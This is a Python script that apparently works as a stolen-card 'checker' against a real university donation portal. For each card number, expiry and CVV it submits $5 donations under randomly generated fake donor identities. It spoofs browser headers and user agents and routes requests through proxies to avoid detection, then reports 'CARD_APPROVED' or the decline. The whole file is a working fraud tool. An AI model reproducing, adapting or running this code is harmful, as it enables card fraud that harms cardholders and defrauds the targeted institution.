import requests
import random
import re
import json
import asyncio
from typing import Optional
from faker import Faker
from user_agent import generate_user_agent
from urllib.parse import quote

fake = Faker()

def parse_proxy(proxy_str: str) -> Optional[str]:
    if not proxy_str:
        return None
    clean_proxy = proxy_str.replace("http://", "").replace("https://", "")
    parts = clean_proxy.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        host, port = parts[0], parts[1]
        user = quote(parts[2], safe='')
        pwd = quote(':'.join(parts[3:]), safe='')
        return f"http://{user}:{pwd}@{host}:{port}"
    elif len(parts) == 2 and parts[1].isdigit():
        return f"http://{clean_proxy}"
    return proxy_str

def gdata():
    fnames = ["john","james","robert","michael","william","david","richard","joseph","thomas","charles"]
    lnames = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com"]
    f = random.choice(fnames)
    l = random.choice(lnames)
    num = random.randint(10, 999)
    email = f"{f}.{l}{num}@{random.choice(domains)}"
    name = f"{f.capitalize()} {l.capitalize()}"
    add = f"{random.randint(100,9999)} {random.choice(['Main','Oak','Pine','Maple','Cedar'])} St"
    city = random.choice(["New York","Los Angeles","Chicago","Houston","Phoenix"])
    zip_code = str(random.randint(10000, 99999))
    phone = f"+1{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
    return email, name, add, city, zip_code, phone

def _run_wallawalla_auth_sync(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    session = requests.Session()
    if proxy_str:
        proxy_url = parse_proxy(proxy_str)
        if proxy_url:
            session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }

    email, name, add, city, zip_code, phone = gdata()
    user_agent = generate_user_agent()

    headers = {
        'authority': 'payment.wallawalla.edu',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://payment.wallawalla.edu',
        'referer': 'https://payment.wallawalla.edu/donate/SMSUMMER',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user_agent,
        'x-requested-with': 'XMLHttpRequest',
    }

    year_str = str(ano)
    exp_year = year_str[-2:] if len(year_str) >= 2 else year_str.zfill(2)
    exp_month = str(mes).zfill(2)

    json_data = {
        'items': [
            {
                'designation_setid': 'SHARE',
                'designation': 'SMSUMMER',
                'data': 'Tommy',
                'amount': '5',
                'anonymous': False,
            },
        ],
        'item_type': 'donation',
        'add_plan': False,
        'is_recurring': False,
        'metadata': {
            'paper_receipt_requested': False,
            'comments': 'Welson',
        },
        'payment_method': 'cc',
        'first_name': name,
        'last_name': name,
        'phone': phone,
        'email': email,
        'street1': add,
        'city': city,
        'state': 'NY',
        'postal': zip_code,
        'country': 'US',
        'card_number': cc,
        'expiration_month': exp_month,
        'expiration_year': exp_year,
        'cv_number': cvv,
        'save_information': False,
        'account_nickname': '',
    }

    try:
        # 1. Validate Transaction
        resp = session.post(
            'https://payment.wallawalla.edu/api/v1/validate/transaction',
            headers=headers,
            json=json_data,
            timeout=30
        )
        data = resp.json()
        
        if 'transaction' not in data:
            # Check for error or message
            err_msg = data.get('error', {}).get('message', data.get('message', 'Validation failed'))
            return False, err_msg
        
        transaction = data['transaction']
        
        # 2. Pay
        json_pay = {
            'transaction': transaction,
            'ach_authorization': False,
        }
        
        resp2 = session.post(
            'https://payment.wallawalla.edu/api/v1/pay',
            headers=headers,
            json=json_pay,
            timeout=30
        )
        result = resp2.json()
        
        if result.get('success') or result.get('status') == 'success':
            return True, "CARD_APPROVED"
        elif result.get('error') or result.get('message'):
            error_msg = result.get('error', result.get('message', 'Decline / Payment failed'))
            return False, error_msg
        else:
            return False, "Unknown response status"

    except Exception as e:
        return False, f"Wallawalla transaction error: {str(e)}"

async def process_wallawalla_auth(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    return await asyncio.to_thread(_run_wallawalla_auth_sync, cc, mes, ano, cvv, proxy_str)
